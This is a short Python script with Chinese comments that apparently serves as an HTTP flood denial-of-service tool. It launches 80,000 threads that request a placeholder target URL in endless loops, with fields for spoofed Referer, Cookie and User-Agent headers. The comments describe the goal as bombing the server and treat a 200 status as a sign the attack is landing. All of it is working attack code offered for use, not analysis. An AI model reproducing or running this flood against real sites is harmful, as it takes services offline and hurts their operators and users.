import requests 
import threading #多線程
header={
    'Referer':"", #這邊放referer
    'Cookie':'', #這邊放cookie,如果沒有可以把前面的給註解起來
    'User-Agent':'' #這邊放user-agent
}
#定義run,反正就是迴圈爬蟲,用一堆蟲蟲炸server
def run(url):
    while True:
        try:
            res=requests.get(url,headers=header)
            #print(res.status_code)    #這是看狀態的,要200才會有攻擊力
        except:
            pass    #沒回應就跳過
#這邊for遍歷數字放多少可看作多少線程轟炸
for i in range(80000):threading.Thread(target=run,args=("這邊放連結(直接塞referer的連結就行)",)).start()
